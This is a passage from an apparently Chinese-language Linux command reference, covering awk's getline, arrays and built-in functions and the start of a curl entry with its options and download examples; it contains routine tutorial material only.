test\n```\n\n执行shell的date命令，并通过管道输出给getline，然后getline从管道中读取并将输入赋值给out，split函数把变量out转化成数组mon，然后打印数组mon的第二个元素：\n\n```shell\nawk 'BEGIN{ \"date\" | getline out; split(out,mon); print mon[2] }' test\n```\n\n命令ls的输出传递给geline作为输入，循环使getline从ls的输出中读取一行，并把它打印到屏幕。这里没有输入文件，因为BEGIN块在打开输入文件前执行，所以可以忽略输入文件。\n\n```shell\nawk 'BEGIN{ while( \"ls\" | getline) print }'\n```\n\n###  关闭文件 \n\nawk中允许在程序中关闭一个输入或输出文件，方法是使用awk的close语句。\n\n```shell\nclose(\"filename\")\n```\n\nfilename可以是getline打开的文件，也可以是stdin，包含文件名的变量或者getline使用的确切命令。或一个输出文件，可以是stdout，包含文件名的变量或使用管道的确切命令。\n\n###  输出到一个文件 \n\nawk中允许用如下方式将结果输出到一个文件：\n\n```shell\necho | awk '{printf(\"hello word!n\") > \"datafile\"}'\n# 或\necho | awk '{printf(\"hello word!n\") >> \"datafile\"}'\n```\n\n## 设置字段定界符  \n\n默认的字段定界符是空格，可以使用`-F \"定界符\"`  明确指定一个定界符：\n\n```shell\nawk -F: '{ print $NF }' /etc/passwd\n# 或\nawk 'BEGIN{ FS=\":\" } { print $NF }' /etc/passwd\n```\n\n在`BEGIN语句块`中则可以用`OFS=“定界符”`设置输出字段的定界符。\n\n## 流程控制语句  \n\n在linux awk的while、do-while和for语句中允许使用break,continue语句来控制流程走向，也允许使用exit这样的语句来退出。break中断当前正在执行的循环并跳到循环外执行下一条语句。if 是流程选择用法。awk中，流程控制语句，语法结构，与c语言类型。有了这些语句，其实很多shell程序都可以交给awk，而且性能是非常快的。下面是各个语句用法。\n\n###  条件判断语句 \n\n```shell\nif(表达式)\n  语句1\nelse\n  语句2\n```\n\n格式中语句1可以是多个语句，为了方便判断和阅读，最好将多个语句用{}括起来。awk分枝结构允许嵌套，其格式为：\n\n```shell\nif(表达式)\n  {语句1}\nelse if(表达式)\n  {语句2}\nelse\n  {语句3}\n```\n\n示例：\n\n```shell\nawk 'BEGIN{\ntest=100;\nif(test>90){\n  print \"very good\";\n  }\n  else if(test>60){\n    print \"good\";\n  }\n  else{\n    print \"no pass\";\n  }\n}'\n\nvery good\n```\n\n每条命令语句后面可以用`;` **分号** 结尾。\n\n###  循环语句 \n\n### # while语句 \n\n```shell\nwhile(表达式)\n  {语句}\n```\n\n示例：\n\n```shell\nawk 'BEGIN{\ntest=100;\ntotal=0;\nwhile(i<=test){\n  total+=i;\n  i++;\n}\nprint total;\n}'\n5050\n```\n\n### # for循环 \n\nfor循环有两种格式：\n\n格式1：\n\n```shell\nfor(变量 in 数组)\n  {语句}\n```\n\n示例：\n\n```shell\nawk 'BEGIN{\nfor(k in ENVIRON){\n  print k\"=\"ENVIRON[k];\n}\n\n}'\nTERM=linux\nG_BROKEN_FILENAMES=1\nSHLVL=1\npwd=/root/text\n...\nlogname=root\nHOME=/root\nSSH_CLIENT=192.168.1.21 53087 22\n```\n\n注：ENVIRON是awk常量，是子典型数组。\n\n格式2：\n\n```shell\nfor(变量;条件;表达式)\n  {语句}\n```\n\n示例：\n\n```shell\nawk 'BEGIN{\ntotal=0;\nfor(i=0;i<=100;i++){\n  total+=i;\n}\nprint total;\n}'\n5050\n```\n\n### # do循环 \n\n```shell\ndo\n{语句} while(条件)\n```\n\n例子：\n\n```shell\nawk 'BEGIN{ \ntotal=0;\ni=0;\ndo {total+=i;i++;} while(i<=100)\n  print total;\n}'\n5050\n```\n\n###  其他语句 \n\n* **break**  当 break 语句用于 while 或 for 语句时，导致退出程序循环。\n* **continue**  当 continue 语句用于 while 或 for 语句时，使程序循环移动到下一个迭代。\n* **next**  能能够导致读入下一个输入行，并返回到脚本的顶部。这可以避免对当前输入行执行其他的操作过程。\n* **exit**  语句使主输入循环退出并将控制转移到END,如果END存在的话。如果没有定义END规则，或在END中应用exit语句，则终止脚本的执行。\n\n## 数组应用  \n\n数组是awk的灵魂，处理文本中最不能少的就是它的数组处理。因为数组索引（下标）可以是数字和字符串在awk中数组叫做关联数组(associative arrays)。awk 中的数组不必提前声明，也不必声明大小。数组元素用0或空字符串来初始化，这根据上下文而定。\n\n###  数组的定义 \n\n数字做数组索引（下标）：\n\n```shell\nArray[1]=\"sun\"\nArray[2]=\"kai\"\n```\n\n字符串做数组索引（下标）：\n\n```shell\nArray[\"first\"]=\"www\"\nArray\"[last\"]=\"name\"\nArray[\"birth\"]=\"1987\"\n```\n\n使用中`print Array[1]`会打印出sun；使用`print Array[2]`会打印出kai；使用`print[\"birth\"]`会得到1987。\n\n **读取数组的值** \n\n```shell\n{ for(item in array) {print array[item]}; }       #输出的顺序是随机的\n{ for(i=1;i<=len;i++) {print array[i]}; }         #Len是数组的长度\n```\n\n###  数组相关函数 \n\n**得到数组长度：** \n\n```shell\nawk 'BEGIN{info=\"it is a test\";lens=split(info,tA,\" \");print length(tA),lens;}'\n4 4\n```\n\nlength返回字符串以及数组长度，split进行分割字符串为数组，也会返回分割得到数组长度。\n\n```shell\nawk 'BEGIN{info=\"it is a test\";split(info,tA,\" \");print asort(tA);}'\n4\n```\n\nasort对数组进行排序，返回数组长度。\n\n**输出数组内容（无序，有序输出）：** \n\n```shell\nawk 'BEGIN{info=\"it is a test\";split(info,tA,\" \");for(k in tA){print k,tA[k];}}'\n4 test\n1 it\n2 is\n3 a \n```\n\n`for…in`输出，因为数组是关联数组，默认是无序的。所以通过`for…in`得到是无序的数组。如果需要得到有序数组，需要通过下标获得。\n\n```shell\nawk 'BEGIN{info=\"it is a test\";tlen=split(info,tA,\" \");for(k=1;k<=tlen;k++){print k,tA[k];}}'\n1 it\n2 is\n3 a\n4 test\n```\n\n注意：数组下标是从1开始，与C数组不一样。\n\n**判断键值存在以及删除键值：** \n\n```shell\n# 错误的判断方法：\nawk 'BEGIN{tB[\"a\"]=\"a1\";tB[\"b\"]=\"b1\";if(tB[\"c\"]!=\"1\"){print \"no found\";};for(k in tB){print k,tB[k];}}' \nno found\na a1\nb b1\nc\n```\n\n以上出现奇怪问题，`tB[“c”]`没有定义，但是循环时候，发现已经存在该键值，它的值为空，这里需要注意，awk数组是关联数组，只要通过数组引用它的key，就会自动创建改序列。\n\n```shell\n# 正确判断方法：\nawk 'BEGIN{tB[\"a\"]=\"a1\";tB[\"b\"]=\"b1\";if( \"c\" in tB){print \"ok\";};for(k in tB){print k,tB[k];}}'  \na a1\nb b1\n```\n\n`if(key in array)`通过这种方法判断数组中是否包含`key`键值。\n\n```shell\n#删除键值：\nawk 'BEGIN{tB[\"a\"]=\"a1\";tB[\"b\"]=\"b1\";delete tB[\"a\"];for(k in tB){print k,tB[k];}}'                     \nb b1\n```\n\n`delete array[key]`可以删除，对应数组`key`的，序列值。\n\n###  二维、多维数组使用 \n\nawk的多维数组在本质上是一维数组，更确切一点，awk在存储上并不支持多维数组。awk提供了逻辑上模拟二维数组的访问方式。例如，`array[2,4]=1`这样的访问是允许的。awk使用一个特殊的字符串`SUBSEP(�34)`作为分割字段，在上面的例子中，关联数组array存储的键值实际上是2�344。\n\n类似一维数组的成员测试，多维数组可以使用`if ( (i,j) in array)`这样的语法，但是下标必须放置在圆括号中。类似一维数组的循环访问，多维数组使用`for ( item in array )`这样的语法遍历数组。与一维数组不同的是，多维数组必须使用`split()`函数来访问单独的下标分量。\n\n```shell\nawk 'BEGIN{\nfor(i=1;i<=9;i++){\n  for(j=1;j<=9;j++){\n    tarr[i,j]=i*j; print i,\"*\",j,\"=\",tarr[i,j];\n  }\n}\n}'\n1 * 1 = 1\n1 * 2 = 2\n1 * 3 = 3\n1 * 4 = 4\n1 * 5 = 5\n1 * 6 = 6 \n...\n9 * 6 = 54\n9 * 7 = 63\n9 * 8 = 72\n9 * 9 = 81\n```\n\n可以通过`array[k,k2]`引用获得数组内容。\n\n另一种方法：\n\n```shell\nawk 'BEGIN{\nfor(i=1;i<=9;i++){\n  for(j=1;j<=9;j++){\n    tarr[i,j]=i*j;\n  }\n}\nfor(m in tarr){\n  split(m,tarr2,SUBSEP); print tarr2[1],\"*\",tarr2[2],\"=\",tarr[m];\n}\n}'\n```\n\n## 内置函数  \n\nawk内置函数，主要分以下3种类似：算数函数、字符串函数、其它一般函数、时间函数。\n\n###  算术函数 \n\n| 格式 | 描述 |\n| ---- | ---- |\n| atan2( y, x ) | 返回 y/x 的反正切。 |\n| cos( x ) | 返回 x 的余弦；x 是弧度。 |\n| sin( x ) | 返回 x 的正弦；x 是弧度。 |\n| exp( x ) | 返回 x 幂函数。 |\n| log( x ) | 返回 x 的自然对数。 |\n| sqrt( x ) | 返回 x 平方根。 |\n| int( x ) | 返回 x 的截断至整数的值。 |\n| rand( ) | 返回任意数字 n，其中 0 <= n < 1。 |\n| srand( [expr] ) | 将 rand 函数的种子值设置为 Expr 参数的值，或如果省略 Expr 参数则使用某天的时间。返回先前的种子值。 |\n\n\n举例说明：\n\n```shell\nawk 'BEGIN{OFMT=\"%.3f\";fs=sin(1);fe=exp(10);fl=log(10);fi=int(3.1415);print fs,fe,fl,fi;}'\n0.841 22026.466 2.303 3\n\n```\n\nOFMT 设置输出数据格式是保留3位小数。\n\n获得随机数：\n\n```shell\nawk 'BEGIN{srand();fr=int(100*rand());print fr;}'\n78\nawk 'BEGIN{srand();fr=int(100*rand());print fr;}'\n31\nawk 'BEGIN{srand();fr=int(100*rand());print fr;}'\n41 \n```\n\n###  字符串函数 \n\n| 格式 | 描述 |\n| ---- | ---- |\n| gsub( Ere, Repl, [ In ] ) | 除了正则表达式所有具体值被替代这点，它和 sub 函数完全一样地执行。 |\n| sub( Ere, Repl, [ In ] ) | 用 Repl 参数指定的字符串替换 In 参数指定的字符串中的由 Ere 参数指定的扩展正则表达式的第一个具体值。sub 函数返回替换的数量。出现在 Repl 参数指定的字符串中的 &（和符号）由 In 参数指定的与 Ere 参数的指定的扩展正则表达式匹配的字符串替换。如果未指定 In 参数，缺省值是整个记录（$0 记录变量）。 |\n| index( String1, String2 ) | 在由 String1 参数指定的字符串（其中有出现 String2 指定的参数）中，返回位置，从 1 开始编号。如果 String2 参数不在 String1 参数中出现，则返回 0（零）。 |\n| length [(String)] | 返回 String 参数指定的字符串的长度（字符形式）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。 |\n| blength [(String)] | 返回 String 参数指定的字符串的长度（以字节为单位）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。 |\n| substr( String, M, [ N ] ) | 返回具有 N 参数指定的字符数量子串。子串从 String 参数指定的字符串取得，其字符以 M 参数指定的位置开始。M 参数指定为将 String 参数中的第一个字符作为编号 1。如果未指定 N 参数，则子串的长度将是 M 参数指定的位置到 String 参数的末尾 的长度。 |\n| match( String, Ere ) | 在 String 参数指定的字符串（Ere 参数指定的扩展正则表达式出现在其中）中返回位置（字符形式），从 1 开始编号，或如果 Ere 参数不出现，则返回 0（零）。RSTART 特殊变量设置为返回值。RLENGTH 特殊变量设置为匹配的字符串的长度，或如果未找到任何匹配，则设置为 -1（负一）。|\n| split( String, A, [Ere] ) | 将 String 参数指定的参数分割为数组元素 A[1], A[2], . . ., A[n]，并返回 n 变量的值。此分隔可以通过 Ere 参数指定的扩展正则表达式进行，或用当前字段分隔符（FS 特殊变量）来进行（如果没有给出 Ere 参数）。除非上下文指明特定的元素还应具有一个数字值，否则 A 数组中的元素用字符串值来创建。 |\n| tolower( String ) | 返回 String 参数指定的字符串，字符串中每个大写字符将更改为小写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。 |\n| toupper( String ) | 返回 String 参数指定的字符串，字符串中每个小写字符将更改为大写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。 |\n| sprintf(Format, Expr, Expr, . . . ) | 根据 Format 参数指定的 printf 子例程格式字符串来格式化 Expr 参数指定的表达式并返回最后生成的字符串。 |\n\n\n注：Ere都可以是正则表达式。\n\n**gsub,sub使用** \n\n```shell\nawk 'BEGIN{info=\"this is a test2010test!\";gsub(/[0-9]+/,\"!\",info);print info}'\nthis is a test!test!\n```\n\n在 info中查找满足正则表达式，`/[0-9]+/` 用`””`替换，并且替换后的值，赋值给info 未给info值，默认是`$0`\n\n **查找字符串（index使用）** \n\n```shell\nawk 'BEGIN{info=\"this is a test2010test!\";print index(info,\"test\")?\"ok\":\"no found\";}'\nok\n```\n\n未找到，返回0\n\n**正则表达式匹配查找(match使用）** \n\n```\nawk 'BEGIN{info=\"this is a test2010test!\";print match(info,/[0-9]+/)?\"ok\":\"no found\";}'\nok\n```\n\n**截取字符串(substr使用）** \n\n```shell\n[wangsl@centos5 ~]$ awk 'BEGIN{info=\"this is a test2010test!\";print substr(info,4,10);}'\ns is a tes\n```\n\n从第 4个 字符开始，截取10个长度字符串\n\n**字符串分割（split使用）** \n\n```shell\nawk 'BEGIN{info=\"this is a test\";split(info,tA,\" \");print length(tA);for(k in tA){print k,tA[k];}}'\n4\n4 test\n1 this\n2 is\n3 a\n```\n\n分割info，动态创建数组tA，这里比较有意思，`awk for …in`循环，是一个无序的循环。 并不是从数组下标1…n ，因此使用时候需要注意。\n\n**格式化字符串输出（sprintf使用）** \n\n格式化字符串格式：\n\n其中格式化字符串包括两部分内容：一部分是正常字符，这些字符将按原样输出; 另一部分是格式化规定字符，以`\"%\"`开始，后跟一个或几个规定字符,用来确定输出内容格式。\n\n| 格式 | 描述 | 格式 | 描述 |\n| ---- | ---- | ---- | ---- |\n| %d | 十进制有符号整数 | %u | 十进制无符号整数 |\n| %f | 浮点数 | %s | 字符串 |\n| %c | 单个字符 | %p | 指针的值 |\n| %e | 指数形式的浮点数 | %x | %X 无符号以十六进制表示的整数 |\n| %o | 无符号以八进制表示的整数 | %g | 自动选择合适的表示法 |\n\n\n```shell\nawk 'BEGIN{n1=124.113;n2=-1.224;n3=1.2345; printf(\"%.2f,%.2u,%.2g,%X,%on\",n1,n2,n3,n1,n1);}'\n124.11,18446744073709551615,1.2,7C,174\n```\n\n###  一般函数 \n\n| 格式 | 描述  |\n| ---- | ---- |\n| close( Expression ) | 用同一个带字符串值的 Expression 参数来关闭由 print 或 printf 语句打开的或调用 getline 函数打开的文件或管道。如果文件或管道成功关闭，则返回 0；其它情况下返回非零值。如果打算写一个文件，并稍后在同一个程序中读取文件，则 close 语句是必需的。 |\n| system(command ) | 执行 Command 参数指定的命令，并返回退出状态。等同于 system 子例程。|\n| Expression `\\|` getline [ Variable ] | 从来自 Expression 参数指定的命令的输出中通过管道传送的流中读取一个输入记录，并将该记录的值指定给 Variable 参数指定的变量。如果当前未打开将 Expression 参数的值作为其命令名称的流，则创建流。创建的流等同于调用 popen 子例程，此时 Command 参数取 Expression 参数的值且 Mode 参数设置为一个是 r 的值。只要流保留打开且 Expression 参数求得同一个字符串，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。|\n| getline [ Variable ] < Expression | 从 Expression 参数指定的文件读取输入的下一个记录，并将 Variable 参数指定的变量设置为该记录的值。只要流保留打开且 Expression 参数对同一个字符串求值，则对 getline 函数的每次后续调用读取另一个记录。如果未指定 Variable 参数，则 $0 记录变量和 NF 特殊变量设置为从流读取的记录。 |\n| getline [ Variable ] | 将 Variable 参数指定的变量设置为从当前输入文件读取的下一个输入记录。如果未指定 Variable 参数，则 $0 记录变量设置为该记录的值，还将设置 NF、NR 和 FNR 特殊变量。 |\n\n**打开外部文件（close用法）** \n\n```shell\nawk 'BEGIN{while(\"cat /etc/passwd\"|getline){print $0;};close(\"/etc/passwd\");}'\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n```\n\n**逐行读取外部文件(getline使用方法）** \n\n```shell\nawk 'BEGIN{while(getline < \"/etc/passwd\"){print $0;};close(\"/etc/passwd\");}'\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n```\n\n```shell\nawk 'BEGIN{print \"Enter your name:\";getline name;print name;}'\nEnter your name:\nchengmo\nchengmo\n```\n\n**调用外部应用程序(system使用方法）** \n\n```shell\nawk 'BEGIN{b=system(\"ls -al\");print b;}'\ntotal 42092\ndrwxr-xr-x 14 chengmo chengmo     4096 09-30 17:47 .\ndrwxr-xr-x 95 root   root       4096 10-08 14:01 ..\n```\n\nb返回值，是执行结果。\n\n###  时间函数 \n\n| 格式 | 描述  |\n| ---- | ---- |\n| 函数名 | 说明 |\n| mktime( YYYY MM dd HH MM ss[ DST]) | 生成时间格式 |\n| strftime([format [, timestamp]]) | 格式化时间输出，将时间戳转为时间字符串具体格式，见下表。 |\n| systime() | 得到时间戳，返回从1970年1月1日开始到当前时间(不计闰年)的整秒数 |\n\n**建指定时间(mktime使用）** \n\n```shell\nawk 'BEGIN{tstamp=mktime(\"2001 01 01 12 12 12\");print strftime(\"%c\",tstamp);}'\n2001年01月01日 星期一 12时12分12秒\n```\n\n```shell\nawk 'BEGIN{tstamp1=mktime(\"2001 01 01 12 12 12\");tstamp2=mktime(\"2001 02 01 0 0 0\");print tstamp2-tstamp1;}'\n2634468\n```\n\n求2个时间段中间时间差，介绍了strftime使用方法\n\n```shell\nawk 'BEGIN{tstamp1=mktime(\"2001 01 01 12 12 12\");tstamp2=systime();print tstamp2-tstamp1;}' \n308201392\n```\n\n**strftime日期和时间格式说明符** \n\n| 格式 | 描述  |\n| ---- | ---- |\n| %a | 星期几的缩写(Sun) |\n| %A | 星期几的完整写法(Sunday) |\n| %b | 月名的缩写(Oct) |\n| %B | 月名的完整写法(October) |\n| %c | 本地日期和时间 |\n| %d | 十进制日期 |\n| %D | 日期 08/20/99 |\n| %e | 日期，如果只有一位会补上一个空格 |\n| %H | 用十进制表示24小时格式的小时 |\n| %I | 用十进制表示12小时格式的小时 |\n| %j | 从1月1日起一年中的第几天 |\n| %m | 十进制表示的月份 |\n| %M | 十进制表示的分钟 |\n| %p | 12小时表示法(AM/PM) |\n| %S | 十进制表示的秒 |\n| %U | 十进制表示的一年中的第几个星期(星期天作为一个星期的开始) |\n| %w | 十进制表示的星期几(星期天是0) |\n| %W | 十进制表示的一年中的第几个星期(星期一作为一个星期的开始) |\n| %x | 重新设置本地日期(08/20/99) |\n| %X | 重新设置本地时间(12:00:00) |\n| %y | 两位数字表示的年(99) |\n| %Y | 当前月份 |\n| %% | 百分号(%) |\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","awk"]},{"title":"【Linux 命令】curl","url":"/linux-command/curl/","content":"\n利用URL规则在命令行下工作的文件传输工具\n\n## 补充说明\n\n**curl命令** 是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。做网页处理流程和数据检索自动化，curl可以祝一臂之力。\n\n### 语法\n\n```shell\ncurl(选项)(参数)\n```\n\n### 选项\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\n<tbody>\n<tr><td>-a/--append</td><td>上传文件时，附加到目标文件</td></tr>\n<tr><td>-A/--user-agent <string></td><td>设置用户代理发送给服务器</td></tr>\n<tr><td>-anyauth</td><td>可以使用“任何”身份验证方法</td></tr>\n<tr><td>-b/--cookie <name=string/file></td><td>cookie字符串或文件读取位置</td></tr>\n<tr><td>     --basic</td><td>使用HTTP基本验证</td></tr>\n<tr><td>-B/--use-ascii</td><td>使用ASCII /文本传输</td></tr>\n<tr><td>-c/--cookie-jar <file></td><td>操作结束后把cookie写入到这个文件中</td></tr>\n<tr><td>-C/--continue-at <offset></td><td>断点续传</td></tr>\n<tr><td>-d/--data <data></td><td>HTTP POST方式传送数据</td></tr>\n<tr><td>     --data-ascii <data></td><td>以ascii的方式post数据</td></tr>\n<tr><td>     --data-binary <data></td><td>以二进制的方式post数据</td></tr>\n<tr><td>     --negotiate</td><td>使用HTTP身份验证</td></tr>\n<tr><td>     --digest</td><td>使用数字身份验证</td></tr>\n<tr><td>     --disable-eprt</td><td>禁止使用EPRT或LPRT</td></tr>\n<tr><td>     --disable-epsv</td><td>禁止使用EPSV</td></tr>\n<tr><td>-D/--dump-header <file></td><td>把header信息写入到该文件中</td></tr>\n<tr><td>     --egd-file <file></td><td>为随机数据(SSL)设置EGD socket路径</td></tr>\n<tr><td>     --tcp-nodelay</td><td>使用TCP_NODELAY选项</td></tr>\n<tr><td>-e/--referer</td><td>来源网址</td></tr>\n<tr><td>-E/--cert <cert:[passwd]></td><td>客户端证书文件和密码 (SSL)</td></tr>\n<tr><td>     --cert-type <type></td><td>证书文件类型 (DER/PEM/ENG) (SSL)</td></tr>\n<tr><td>     --key <key></td><td>私钥文件名 (SSL)</td></tr>\n<tr><td>     --key-type <type></td><td>私钥文件类型 (DER/PEM/ENG) (SSL)</td></tr>\n<tr><td>     --pass <pass></td><td>私钥密码 (SSL)</td></tr>\n<tr><td>     --engine <eng></td><td>加密引擎使用 (SSL). \"--engine list\" for list</td></tr>\n<tr><td>     --cacert <file></td><td>CA证书 (SSL)</td></tr>\n<tr><td>     --capath <directory></td><td>CA目录 (made using c_rehash) to verify peer against (SSL)</td></tr>\n<tr><td>     --ciphers <list></td><td>SSL密码</td></tr>\n<tr><td>     --compressed</td><td>要求返回是压缩的形势 (using deflate or gzip)</td></tr>\n<tr><td>     --connect-timeout <seconds></td><td>设置最大请求时间</td></tr>\n<tr><td>     --create-dirs</td><td>建立本地目录的目录层次结构</td></tr>\n<tr><td>     --crlf</td><td>上传是把LF转变成CRLF</td></tr>\n<tr><td>-f/--fail</td><td>连接失败时不显示http错误</td></tr>\n<tr><td>     --ftp-create-dirs</td><td>如果远程目录不存在，创建远程目录</td></tr>\n<tr><td>     --ftp-method [multicwd/nocwd/singlecwd]</td><td>控制CWD的使用</td></tr>\n<tr><td>     --ftp-pasv</td><td>使用 PASV/EPSV 代替端口</td></tr>\n<tr><td>     --ftp-skip-pasv-ip</td><td>使用PASV的时候,忽略该IP地址</td></tr>\n<tr><td>     --ftp-ssl</td><td>尝试用 SSL/TLS 来进行ftp数据传输</td></tr>\n<tr><td>     --ftp-ssl-reqd</td><td>要求用 SSL/TLS 来进行ftp数据传输</td></tr>\n<tr><td>-F/--form <name=content></td><td>模拟http表单提交数据</td></tr>\n<tr><td>     --form-string <name=string></td><td>模拟http表单提交数据</td></tr>\n<tr><td>-g/--globoff</td><td>禁用网址序列和范围使用{}和[]</td></tr>\n<tr><td>-G/--get</td><td>以get的方式来发送数据</td></tr>\n<tr><td>-H/--header <line></td><td>自定义头信息传递给服务器</td></tr>\n<tr><td>     --ignore-content-length</td><td>忽略的HTTP头信息的长度</td></tr>\n<tr><td>-i/--include</td><td>输出时包括protocol头信息</td></tr>\n<tr><td>-I/--head</td><td>只显示请求头信息</td></tr>\n<tr><td>-j/--junk-session-cookies</td><td>读取文件进忽略session cookie</td></tr>\n<tr><td>     --interface <interface></td><td>使用指定网络接口/地址</td></tr>\n<tr><td>     --krb4 <level></td><td>使用指定安全级别的krb4</td></tr>\n<tr><td>-k/--insecure</td><td>允许不使用证书到SSL站点</td></tr>\n<tr><td>-K/--config</td><td>指定的配置文件读取</td></tr>\n<tr><td>-l/--list-only</td><td>列出ftp目录下的文件名称</td></tr>\n<tr><td>     --limit-rate <rate></td><td>设置传输速度</td></tr>\n<tr><td>     --local-port<NUM></td><td>强制使用本地端口号</td></tr>\n<tr><td>-m/--max-time <seconds></td><td>设置最大传输时间</td></tr>\n<tr><td>     --max-redirs <num></td><td>设置最大读取的目录数</td></tr>\n<tr><td>     --max-filesize <bytes></td><td>设置最大下载的文件总量</td></tr>\n<tr><td>-M/--manual</td><td>显示全手动</td></tr>\n<tr><td>-n/--netrc</td><td>从netrc文件中读取用户名和密码</td></tr>\n<tr><td>     --netrc-optional</td><td>使用 .netrc 或者 URL来覆盖-n</td></tr>\n<tr><td>     --ntlm</td><td>使用 HTTP NTLM 身份验证</td></tr>\n<tr><td>-N/--no-buffer</td><td>禁用缓冲输出</td></tr>\n<tr><td>-o/--output</td><td>把输出写到该文件中</td></tr>\n<tr><td>-O/--remote-name</td><td>把输出写到该文件中，保留远程文件的文件名</td></tr>\n<tr><td>-p/--proxytunnel</td><td>使用HTTP代理</td></tr>\n<tr><td>     --proxy-anyauth</td><td>选择任一代理身份验证方法</td></tr>\n<tr><td>     --proxy-basic</td><td>在代理上使用基本身份验证</td></tr>\n<tr><td>     --proxy-digest</td><td>在代理上使用数字身份验证</td></tr>\n<tr><td>     --proxy-ntlm</td><td>在代理上使用ntlm身份验证</td></tr>\n<tr><td>-P/--ftp-port <address></td><td>使用端口地址，而不是使用PASV</td></tr>\n<tr><td>-q</td><td>作为第一个参数，关闭 .curlrc</td></tr>\n<tr><td>-Q/--quote <cmd></td><td>文件传输前，发送命令到服务器</td></tr>\n<tr><td>-r/--range <range></td><td>检索来自HTTP/1.1或FTP服务器字节范围</td></tr>\n<tr><td>--range-file</td><td>读取（SSL）的随机文件</td></tr>\n<tr><td>-R/--remote-time</td><td>在本地生成文件时，保留远程文件时间</td></tr>\n<tr><td>     --retry <num></td><td>传输出现问题时，重试的次数</td></tr>\n<tr><td>     --retry-delay <seconds></td><td>传输出现问题时，设置重试间隔时间</td></tr>\n<tr><td>     --retry-max-time <seconds></td><td>传输出现问题时，设置最大重试时间</td></tr>\n<tr><td>-s/--silent</td><td>静默模式。不输出任何东西</td></tr>\n<tr><td>-S/--show-error</td><td>显示错误</td></tr>\n<tr><td>     --socks4 <host[:port]></td><td>用socks4代理给定主机和端口</td></tr>\n<tr><td>     --socks5 <host[:port]></td><td>用socks5代理给定主机和端口</td></tr>\n<tr><td>     --stderr <file></td><td> </td></tr>\n<tr><td>-t/--telnet-option <OPT=val></td><td>Telnet选项设置</td></tr>\n<tr><td>     --trace <file></td><td>对指定文件进行debug</td></tr>\n<tr><td>     --trace-ascii <file></td><td>Like --跟踪但没有hex输出</td></tr>\n<tr><td>     --trace-time</td><td>跟踪/详细输出时，添加时间戳</td></tr>\n<tr><td>-T/--upload-file <file></td><td>上传文件</td></tr>\n<tr><td>     --url <URL></td><td>Spet URL to work with</td></tr>\n<tr><td>-u/--user <user[:password]></td><td>设置服务器的用户和密码</td></tr>\n<tr><td>-U/--proxy-user <user[:password]></td><td>设置代理用户名和密码</td></tr>\n<tr><td>-w/--write-out [format]</td><td>什么输出完成后</td></tr>\n<tr><td>-x/--proxy <host[:port]></td><td>在给定的端口上使用HTTP代理</td></tr>\n<tr><td>-X/--request <command></td><td>指定什么命令</td></tr>\n<tr><td>-y/--speed-time</td><td>放弃限速所要的时间，默认为30</td></tr>\n<tr><td>-Y/--speed-limit</td><td>停止传输速度的限制，速度时间</td></tr>\n</tbody>\n\n</table>\n\n### 实例\n\n**文件下载**\n\ncurl命令可以用来执行下载、发送各种HTTP请求，指定HTTP头部等操作。如果系统没有curl可以使用`yum install curl`安装，也可以下载安装。curl是将下载文件输出到stdout，将进度信息输出到stderr，不显示进度信息使用`--silent`选项。\n\n```shell\ncurl URL --silent\n```\n\n这条命令是将下载文件输出到终端，所有下载的数据都被写入到stdout。\n\n使用选项`-O`将下载的数据写入到文件，必须使用文件的绝对地址：\n\n```shell\ncurl http://example.com/text.iso --silent -O\n```\n\n选项`-o`将下载数据写入到指定名称的文件中，并使用`--progress`显示进度条：\n\n```shell\ncurl http://example.com/test.iso -o filename.iso --progress\n######################################### 100.0%\n```\n\n**不输出错误和进度信息**\n\n`-s` 参数将不输出错误和进度信息。\n\n```shell\ncurl -s https://www.example.com\n# 上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。\n```\n\n如果想让 curl 不产生任何输出，可以使用下面的命令。\n\n```shell\ncurl -s -o /dev/null https://google.com\n```\n**断点续传**\n\ncurl能够从特定的文件偏移处继续下载，它可以通过指定一个便宜量来下载部分文件：\n\n```shell\ncurl URL/File -C 偏移量\n\n#偏移量是以字节为单位的整数，如果让curl自动推断出正确的续传位置使用-C -：\ncurl -C -URL\n```\n\n**使用curl设置参照页字符串**\n\n参照页是位于HTTP头部中的一个字符串，用来表示用户是从哪个页面到达当前页面的，如果用户点击网页A中的某个连接，那么用户就会跳转到B网页，网页B头部的参照页字符串就包含网页A的URL。\n\n使用`--referer`选项指定参照页字符串：\n\n```shell\ncurl --referer http://www.google.com http://wangchujiang.com\n```\n\n**用curl设置用户代理字符串**\n\n有些网站访问会提示只能使用IE浏览器来访问，这是因为这些网站设置了检查用户代理，可以使用curl把用户代理设置为IE，这样就可以访问了。使用`--user-agent`或者`-A`选项：\n\n```shell\ncurl URL --user-agent \"Mozilla/5.0\"\ncurl URL -A \"Mozilla/5.0\"\n```\n\n其他HTTP头部信息也可以使用curl来发送，使用`-H`\"头部信息\" 传递多个头部信息，例如：\n\n```shell\ncurl -H \"Host:wangchujiang.com\" -H \"accept-language:zh-cn\" URL\n```\n\n**curl的带宽控制和下载配额**\n\n使用`--limit-rate`限制curl的下载速度：\n\n```shell\ncurl URL --limit-rate 50k\n```\n\n命令中用k（千字节）和m（兆字节）指定下载速度限制。\n\n使用`--max-filesize`指定可下载的最大文件大小：\n\n```shell\ncurl URL --max-filesize bytes\n```\n\n如果文件大小超出限制，命令则返回一个非0退出码，如果命令正常则返回0。\n\n```shell\ncurl --limit-rate 200k https://example.com\n# 上面命令将带宽限制在每秒 200K 字节。\n```\n\n**用curl进行认证**\n\n使用curl选项 -u 